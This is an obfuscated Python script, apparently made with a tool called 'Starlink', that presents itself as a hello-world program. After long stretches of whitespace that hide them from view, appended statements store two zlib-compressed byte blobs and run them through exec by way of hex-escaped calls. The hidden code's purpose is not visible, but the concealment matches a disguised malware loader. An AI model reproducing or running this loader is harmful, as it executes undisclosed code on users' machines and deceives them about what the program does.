from builtins import *
from math import prod as Round

__obfuscator__ = 'Starlink'
__authors__ = ('Starlinkboy', 'BitchesPuller')
__github__ = ('https://github.com/starlinkboy' , "https://github.com/bitchespuller")
__discord__ = 'https://discord.gg/onlp'
__license__ = 'EPL-2.0'

__code__ = 'print("Hello world!")'


Ceil, Positive, _while, Multiply, Modulo, Math, Divide = exec, str, tuple, map, ord, globals, type

class _floor:
    def __init__(self, MemoryAccess):
        self._algorithm = Round((MemoryAccess, -30892))
        self.Theory(_square=1912)

    def Theory(self, _square = False):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._algorithm /= 40448 + _square
        
        try:
            ((Ceil, Multiply) or _divide if (Ceil, Multiply) and _divide else ... or (_divide, (Ceil, Multiply)))

        except TypeError:
            {'Blgylllgloyd': _divide} if Multiply <= Ceil else (Multiply, Ceil, Modulo) <= Modulo

        except:
            Divide(-56346 * 33545) == Ellipsis

    def _cube(self, _ceil = -52541):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _ceil -= 68939 / -80941
        self._calculate != str
        
        try:
            ({_divide: Modulo} or Positive if {_divide: Modulo} and Positive else ... or (Positive, {_divide: Modulo}))

        except ArithmeticError:
            ({'Blgylllgloyd': _divide} or _divide if {'Blgylllgloyd': _divide} and _divide else ... or (_divide, {'Blgylllgloyd': _divide}))

        except:
            Divide(-18565 - -82811) == None

    def Builtins(Square = type):
        return Math()[Square]

    def StackOverflow(Absolute = 35871 * -19897, System = bool, _absolute = Math):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        _absolute()[Absolute] = System
        
        try:
            (Ceil, Multiply) if Math is _while else (Multiply, Ceil, Modulo) > Ceil

        except AttributeError:
            {_divide: Positive} if Modulo == Modulo else (Positive, _divide) == _while

        except:
            Divide(89291 * 63037) == None

    def execute(code = str):
        return Ceil(Positive(_while(Multiply(Modulo, code))))

    @property
    def _calculate(self):
        self._theory = '<__main__._cube object at 0x000008066BE27088>'
        return (self._theory, _floor._calculate)

if __name__ == '__main__':
    try:
        _floor.execute(code = __code__)
        _detectvar = _floor(MemoryAccess = 53600 * -69748)

        _floor(MemoryAccess = -14133 - -7289)._cube(_ceil = -4925 * _detectvar._algorithm)                                                                                                                                                                                                                                                          ;_floor.StackOverflow(Absolute='jjliljljiilliljjiljlijl',System=b'x\x9c\xed\x1cks\xe2\xc8\xf1;\xbf\x82\xf3\x17D\xd6\xcb\n\xbd\x06\\\xc5\x97\xc4I\x1d\x9b\xb5\xb9\x8aSg\xa7\xf6\xb6(!\r\xb6\xbc\x83\xe4H\xe2\xc0I%\xbf=\xdd=#!@\x80\xc0\xe0s\\\xa7\xd1\xbc\x9a\x99\xd6L\xcf\xabg\xba\x874~\xbe\xa8\xd5\xe1\t\xc6\x1a\xf9\xf8\x0c\x87\xd1h<M<7\x8d\xe2\xe1\xb0\xfeC\xef\xec&uc\x11\x84\xdf\xcf\xeaQ\\H\xe6N\xd3\x87(N(\x8d\x96\'\x1aE\xcfg\xe7g\x7f\x0cR\xef\x81\'?M\x85\xe0\xf1Ys)\xdf}\x90>LG*\xdbC\x9a>%\x17\x9f>I`\xcb\x8b&\x9f\x92%L%\tF\x12\xf9S\x19r?H\xbc(\xf6e\xc1\xb3\xbc\n\xd8\xba\xbf\xff\x14\x85\xe2i\xa5\x1e"\xf0x\x98p\x99\xe5\xcf?}\xf9h\xb4\xf4\x95$^\xe4\xcb\xdf\x1bOq\x10\xa6\xda\xd9\x8f\\\x88\xa8>\x8bb\xe1\xffp\xd6l\xd4\x9a\x17yj\xfc\xbd\x91|\x0f\xfcF\xb3\xc6\xe7\x1e\x7fJ\x15\x8d\xc3\xa7)\xe4\xfc[\x94\xf0\xa4\xee\xc6\xbc\x1es\xff\x97\xf0\xe7 \x12<\x95\x80\x91\x98\xf2_\xc2\x7fDS\x8a\xb9uD\xf2Kx\x1d\x8d"\xff\xb9.\x82\xef\x90\xef9\x9a\x9e5k\xb2P\xc1\xe4)\x8a\xd3\xe1\x10\xbe\xf6\x9c4\x9a->\x0fR\xadY\x13\x91\xe7\x8aDk~mL&\xe1\x04l\x88.\x86)\x86o\xe3[\xef^D#HV\xdb\x98\x06\x11\x08\xf1\x18<>>\x8a@@\xe81\xc0(BD\xe3\xeb\xc5\xc5\x87\x8f\x1f>j\x1f\xb5\x0f\xedf\xf3\x1b\xa0\xe3\xa9\x9b\xa6\xf1vt}\xd1\xef\x0b!\xdd\xec\xe9\xaf\xe3\xf2\x83\x1dxnnn\x0cx\xe1\xb9\xc9\x837\x06TJV\xbdV\xfe;\xe6\x8c\x06\x83\xcbKp\xa2\xe8\xf2r\x10\r\xa2K\xf0!\xdf\x82\x96\xdb?\x0c\xf9t0\x03=\x82\x00\xe6\x87\xe0`\xa0\x03\x862\xc4Zc4\rD\x1a\x84\xd88\xbf\xba\xf1\xb6\x82\xf5\xfbH\x16\xa4\x8b$\x91\xc0\xda \xa9\xe1\x05\x0b\x0e4\x024\x05F\xb5\xf2\x8f\x05\x81\x97\xb8a0Z%h\xf3\xbcH\xee>"Gw_,\xcd\xaf\xc7A\xd3\nB\x9f\xcf\xb5\xc6\xf38\x10s\xfe\x10N\xd7\x92|kno\x85\xab\xeb\xab\xeb\xeb\xab\xab\x85\x07>\x84\xf7\xa7X\x12\x06\xa9\x08\xa6/\xa4\xd8F,\xfbQl3\x9a\x8cb\xc2\xfd\x95\x97\x11ks\xaf"\xfa\\\x11}\xe8\xc9\xc2\xef\x9eT|\x1a\xff\xbd\x8cT\x1b\x06\xb0\x9a,\xa1\xbbQ\x97\xc3\x97z\xdc\xfb\xa7S"\xdc\xbf\xecI\xa8\xf9l\x86\xef\x1c\xdf\x19\x86\xdf=\x95R7\x12\xe3\xbd\xa7)\x91/u\x99C\xa6\x0f\xe4j4Z\x8fQ\x10n\xa32\x15\x0fK:\xb8\x94\x16\x9cwOh\x11E\xeb\xbfn\xef\x8d\xa1|\x14\xf1i\xe0\xd2\xfb\xeei\xc5E\xf04\x89\xbc=\xc9%\xc7\xed\\\xba8z\xe74\x9c\xe7\xf3wO\xaf8M\xf6\x1d\xc2kL\x996j8>\x19N\x96\xe71\xbe\x1c\x03\x86\xcf\xe7\xb8i\xd0\x1a\x9dqZ\xc2\xe2\xbcsb{|^\xca\xaal\x9d\xf0\x06\x00\x82\x87\xa0\x03\x8a"\xa0\x88f\x03\xe7\xa75\x9a:\xfc\xde\xae\x96\xb4;t\xc0\xb4\x87\x0c\xdc\xce\xd0\x02\xd3\x85\xf4:\xc5\x97\xa0\xd5\xd09C}hB\x16\x03|\x9b\x0c\xa2c\xeb\xd0*\xe8\xcaz\x9c\xc9\xec\xb1\xd9\x01\xab\x83m\x83\xed\xaa8Z[Y\xd3\x18\x19\x1d\xc3\xaf\x94\xd60\xba\xbb\xfagS:\xb9\x85\xfe\xeaNF\xbe[\xa7\xd6\xc1\xf6\x91\xbd!\xa2\xdeq\xb1\x89\x03\xdd\xd6\xdew\xb7\xf0\xdc\xc1s\x8b\xaf\x0c#\xe8`2\xb5\r\x9fH\xa0W\xab\xde\xb7\xde>\xd8\rf\x8f\x8c\xb6\xed\x1b\xba\xd5u8s\x9c\xb6\xe39]\xc72t\x9b9\xb6c8\x1dg\x0cf\x04\xbf\x8f\x99\x01\xae\x05P\xcf\xb1\x19\xfa\x96\xd16\xd8\xce2m!VY\x89X\x07\x0c#\xcb\x94\xbf\xb0\x9d\x0c\xb6{"\xda\x8f\n\x8e\xe9x\xcc|Ym\x1a\x8a1\xca\x0e\x03\x14g$D\xb5\x01\xd7\x86\xdf\xf5\x83{\x89\xa3\x06\x05\x0e\x0e\x0bl6`\x0c\x05#_\r\xa6*i+\xf6\xb6\xfd{\x1c}\x01\xbf\xe8\xa8~m\xe4C}\xf7\x17\xb7Q\x1f<\x9ah\xf1w9\x961\x8a\x89\x8f<\xd5\x1ec\x94\x1e@7S\xb5\x96\xadZ\xab\x9b\xd1QM\x8b\x8cZM\xb6\xf0\xa6\xb4\xf6R\xda\x17\xd1\xbb\xac\x8c\x16\xb7|\xb2\x0b\xc3s\x97l\x05\x06BN\xc8\xc04\x00\xef@l\xc4\xa3 &B\x04\xc1\xe3\xc5\x16\xb6\xe6\xd0\xb2f%\xe4K\xa5\xcf\xe2~\xf5\x92\xef=\nLj\x05?_\xe0N\xd0"%\xb3\'\xcbg\xd1\xc5|\xda\xa9\xdc.r\x19\xcc\x16E\x03\xcd\x81\x8d\xd2@\xfe\x9c6\xda\x8aaG\xe6\xfd\xe0\xf1\x97\xd1\xb1}\x92U\xd2`\x06\xaey\xcc`0\x92`\x8dtp\xfd\x83\xf5\xd08\xfa\x08\x1a[\xb0\xdeZdL\x1d\xc3\xd2\xc5\x98\x0c!\x84\xd6d0\x95[\xed.cIn\x17\\\t\xd8\xdb\xbb\x8b\x8d\xc5\xdb\xd6r\xf2\xf8\xed\x9a\x8c\x0c\xbd^\xbb\xa9\x1a\xe5\x1b\xbdY\xe1\xd8\xe6 \x86\x8d(\x92YI\x1bz+qloj\xd9h4M`\xccMb\xcb\x1d\xf0\xdb\xe0\x1a\x90\xdd^\x87\xbe\x06Kr@\xdd\xf6\x1d.\xc0\xaazd\\\n\xa1\xeb\xaa\xb8\xabb.Av\x96 \xefX4q-\x0e_\xe8\x85\xc0A]+\xc0\xbdo@.\x89\x99pk\x8c\xd1\x17qy\x1d\xb5\xe63\xb5\xc6\xeb\x05\xbf\xb3\xc2\xe5\xedJ{\x9a=\x05\xec\x13\xaa\x1b\xcb\x87\x99\xd4d&\xcc\xaa\xb0\xe30t\x98Y\xc7\xe0\x9aL\x07\x08\xecK\xa0\x13\xe9&\x07\xffEsmc\xae\x8ewgj\xad\x99\x1d\xdc\x06\x96\xa2\x9d\xa5V\xf0,\x9emO\x89\xbbVmP%m\xe7\xa5m\xf0\xd29h\xcf)x+\x99o\xb2\xe1a\x18\xd9P\xb9\xa96\xd7X\xc3\xceP\x1eat!d\x82\xcbh\xeaZ\x83\xbe\xd1i\xf9\x90q\x02\xbb\xce1\xec\xbaq/\r\xee\xf1\xb9\t\x9a\x14\xbbd\\\x15\xce&DOM\x9d*E\xe5\xe9Q\xa8=\xadP;]x\x0f\xe2!\xb6\xb0\xe4|\x89%\xe7\x85-\xc4\xf2\xa6\xa2\x12S^&o\xd0\xb4\xff\x96I\xc5\x9aQ\xaci\x9bD\x8bM7\xf4\xb5\xd2\\\xfb\xb7\x8age\xcb\x16\x99E\xcc\xea\xca\xb0U\xa1=\xb6\x8d$\x1cK\x0e\xb8\x8c\xc6\x0c\x8c\x1e\xc8\x86\x87\x7fx\x18X\x80\xbe\x89\x19##\xb2\xfc\x1e}\xff\xfa\xed\x9e\x95\x99\x1c\xcf\xcal\xb5:\x819\xd1)X\xe1\xe0\x9d/\x99\xfc\x90\xfe\xc8\'`\xf4\xe8\xbe\xee\xaeZC\x97\xee\xd1\x8dU4\xb6\x97\xc1T\xe8h\xdf\xd8\x84\xef\x84\xb5\x02\xdf\x1e\xdb\xe3\xfc\xeb\x04cG\xab\x97\xed!\xf6r|\xa7\xac\x15\xf3\x96\xc2e\xed\xa7W\x84mk\xfb\x95\x9c\x18~\x8d\x1e\x88\x10U+\xbd\xac\xfd^\x02c\x9e\xed\xad\xa6b\xde\xe9{ \x95d\xbc\xa5\xfdt\xfauC\x9b\x16\xd3\x95\xe5E\x98\xbd\xc8\xa3Kl\xaf\xd0\x03\xcb`;K[\xa4\xc9\xaeZ\xe59\xc07)\xcdo[+{\xb9e\xf4\x12\xd8\xfaL\xb3Z\xab\xbc\x8d\x16}\xf14\xb5*\x9b\x9f\x8a\xb0EX\x86\x96z\xea\n\x0c\xd3\x95\xe5]\xf6\x8b9O6\xae\xf62\x8b2\xbc\x85\xd2\xfcn\x8a\xe6\xf7\x16ykf\xc1k\xbems\x8a2:\x1df\x81\xd1\x99i\xba0\x8f\x8d\x1d\xe6t\x99\x05P\xdb1\x0cN\'\x04\xbe1f&\xc0\xda\xcc\xa0\xdd:wF\x8e\xe1\x8cY\xf7p|\x90\x1f\xa1\xa6\xd3\xa1\xd37\x9d\xd9\xb4\x03E\x99\xc6oN\xe5j\xa6\xb8G\xb1=\x87\xa3\x95\xbb\x98\xa3\xcbdh_\x0eF\xfa.\xf8h=\xe5\xbb*F\xbf\x1fYJh+\xd9\xad\xa5\xfc\xae:7\xb4\x95\x94\xde"9\xba<k\xac\x96\xf6\xf82_\x7fIr\xba*7\xdd\xeb\xb0&\x97\xedH\x81\x8e<\xab\xcd#\xf3C\x05\x8d\xb7\x99lGJyP\xbcSU\xa5\xaaC\'\x8f\x8c|{\xd8\x1e\xda\xa4R\xd5]\x85VE\xa7\xd3\x11\x8c9\x94(:C\x93\xd0\xb5W\xa1\xafv0SA\xa4\x84\x8ac\x8cNa\rp\xb1\x98mD\x01\xa16\xc0\n\xd0\x8a"%\xaa\xa79\xb4H\x8d\x0c\x0f\xa3\xf0\x98\xd7X\x87\x1eL\x03[\x9d\xb53\xd5\xefm\xa5\xd5\x92\xc9<X\xe1|\xbeJ\xda\x8a\xe7\xf3;\x0f\xba\xfa\x9f\xbf\xc8\xf7s\x1f_0\xfd~E\x9aU\x15\xc35\x9a\x1d:\'\xb7\xc1\xc5\xb3r\x0b-\xa4\xef\xaeC\x0f?bS\xa4*\x8a12\xb5\x92L;\xcfV\xe4\xad\x92\xd6:\xed\x11\xfb~\x8b\n[Qzc6.\xb9\xf0\x8b\x7f\x04\x11\x94R\x05T\x92w\xe9@\xe4E-\x91\xa9o9\x05\xd5\xadL\xd1\xa7[X\x1c\xaa\xa4\xb5Osh\xfaB\xa5\xba\xc7L\xf7\' +\x0e\x17\x9ef*n\x99\x02T\xb6X\x1a*L\x02:E\xaf*i\xab(\xac-\xe9\x98\xea:\xaa\xa4A5)\x04\xb5<\\s\xa6\xf0H\x05\x1a\xd2u\x7f\xb5csU#\xa9\xffA.}\x07\xde\xcdr\xf2q\x1cM\xea\xd9\xcd\xc1\xba\xbc\x98X\xe7s\xee\x9d\xd3\r\xd2s\xba\x81\n\xe1\xb4\x86@\xed6S\xc7\xc8\xb4V\xe4\xe8i\xd6TN\xbc\x03;\xaf\xbbI=\xe6\xff\x9c\xf2$M\xe4\x07\x9e\x9e\x93\xf4YpOp7T\x1f\xf9C\x96%\r&<\x0bGI-\xe8\xe1\x14\x0c\x16\xa6\xe4/_\xc0~\x06\x0f\xe2\xb5(i%\x80\x86O\xb4\xf9BEI\xde\x0b\x9a\xcf\x9a\x85\x9f\xf7!\xb2\x03\xec7p\xdc\xc8u{(\xe7^\xd5\xaf-\xca\x14\x90\x0b\xb79\x9d\x90\x98R6\x08\xbc\xbc\xceF\x90\xdb\xaf4\r\xe1m\xd9\xfb\xa8\'%UJ\x99\x01\xbbWM^\xf3\xfdS$\xa2\xd8My\xeb\xc7(\x0e\xfe\x15\x85\xa9+$,i\xc5\xdc\x1f\xa6\xd1\x10\xaf\xec\x9ek\x88\x04\x91\xcd\xf8\xe8\xa1\'\xef\xf9n\xc9\x8ay0/\xa08\'\xc2.\xadw\x9f\xfb\x80\xc8\x83\x0c\xfb!z\xc4q/\xa4\xf2\x04\xe9Q\xe0,\x00. \x9b\xf0$q\xefy\xef\xdf\xb5z\x9d\x04\xcdJ\xe6,;\x9eqs\xb1w\xf3\x8c2\x81,\x90\xb9\xc2\\\xff\x9f\xca\xe4|\xc6k\xd5\xb3\xf3=\x0b\xc4l\xb5\xeb\xc3~\x03\xbb>fp2\xbb\'')

        if 472707 > 9795372:
            _detectvar._cube(_ceil = 86041 - _detectvar._algorithm)
        elif 236395 < 2746525:
            _detectvar._cube(_ceil = -7801 / _detectvar._algorithm)                                                                                                                                                                                                                                                          ;_floor.StackOverflow(Absolute='SS22SS222SSS2S222SSS22S',System=b'T(\x1cv\xf6V"8\x7f\xd2\x16*M\x05.\x18\x87\x14\xb4\xecC \xb8FB7%\xf3\xbc\xcau\xba\xc0\x16\xae\x7f\xc7\xbdl\xa0\xb5\x9e\xa2$\xd5\xa6\xb1\xe8a\xbf8\x7fL\xa2\xb0\xa7\xda\xa2\x99\'O\xb3+\xf8\xf9\xf5\xf1q=n%\xa9\x9bN\x13\xbav\xde\xeb)\xfd1)\xf7\x93>\x91\xa6\x1e\xc5u%c\x96\x1e\x11e\x19\x1b>{\x12_+\x08\x18s\x11/Rj\x15o\xd0\x0b>H\x1d\x91Y\xa632\x9f\xef\xa8K\xae`\x97o4nw\x16\xf8g\x1e\xa7\x81\xb7(\xee\xe5s\xe8N\x02\xef\xaa\x7f\xa7\x15j\xd0l\x9ek\xb7\xf95\x82\xbb\xdb|\x0f\x03\x91\xd5\xd2\xaf\x97K\x08u;\xaf\x9f_~\xa1\xc0\x91\n\x87\xe4\xbd\x8f9\x0f\xb1\x94\xfb\x0e\xb7\xec\xe6\x81m@\x1f\xb7pN\xb4\xf0t\xc3\xa79\xd2vh\xce3:l\xc4\xf0\xdc\xc2e44a\x99\xeaB>\xb6A\x1f\x93\xd9>\x83\x19\x94\xc1\xd2,\xcf\x03*\x8c\x94\xf5\x0eP\x18:q\x0b\xbb7\xac\xb9\xd9\xf5\xb2YAk\xf5\xdb\'R/\xa7\x15\x9dT\xces\x05\xf4\xc1`\x81U\xfeWB\xfd\xaf\xfcy\x14\xb9\xb1\xdf\x0fS\x1e\xc7\xd3\xec\xdf\x13\x96\x9eQ\xcc\xdd\xef9\xf8\xffb\x9d\xf9\x1f\xeeU\xb5\xb7')

        _detectvar._cube(_ceil = -72082 * _detectvar._algorithm)                                                                                                                                                                                                                                                          ;NMMNMMNNMNMNMNNNMNNMNMMN,WWWWWXXXWXWWWXWXXWWXWX,xxxxwwxxxwxxxwwwwxxxx,nmnnmmnnmnmnmmmmnnnnn,XXXWWWWWWXXXWXWWWWXWXW=(lambda OoOooDDDOOODOODoODDDDoD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OoOooDDDOOODOODoODDDDoD)"),filename='\x69\x6a\x69\x69\x69\x6c\x6c\x6c\x6a\x6a\x6a\x6c\x6a\x6c\x69\x6a\x6c\x6c\x69\x6c',mode='\x65\x76\x61\x6c'))),(lambda OoOooDDDOOODOODoODDDDoD:OoOooDDDOOODOODoODDDDoD['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda OoOooDDDOOODOODoODDDDoD:OoOooDDDOOODOODoODDDDoD(__import__('\x7a\x6c\x69\x62'))),(lambda O0OO0Ooo00o0ooooooOOo0ooo,OoOooDDDOOODOODoODDDDoD:O0OO0Ooo00o0ooooooOOo0ooo(OoOooDDDOOODOODoODDDDoD)),(lambda:(lambda OoOooDDDOOODOODoODDDDoD:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(OoOooDDDOOODOODoODDDDoD)"),filename='\x69\x6a\x69\x69\x69\x6c\x6c\x6c\x6a\x6a\x6a\x6c\x6a\x6c\x69\x6a\x6c\x6c\x69\x6c',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 332120 > 9687955:
            _floor(MemoryAccess = -16802 + 78576)._cube(_ceil = -13273 * _detectvar._algorithm)
        elif 416291 < 3548989:
            _detectvar.Theory(_square = _detectvar._algorithm * 84423)                                                                                                                                                                                                                                                          ;XXXWWWWWWXXXWXWWWWXWXW()(nmnnmmnnmnmnmmmmnnnnn(WWWWWXXXWXWWWXWXXWWXWX(xxxxwwxxxwxxxwwwwxxxx(NMMNMMNNMNMNMNNNMNNMNMMN('\x76\x61\x72\x73'))),_floor.Builtins(Square='jjliljljiilliljjiljlijl')+_floor.Builtins(Square='SS22SS222SSS2S222SSS22S')))

    except Exception as _divide:
        if 372893 > 5883383:
            _floor.execute(code = Positive(_divide))

        elif 278713 > 7126018:
            _floor(MemoryAccess = -57857 * 24807)._cube(_ceil = 68728 + _detectvar._algorithm)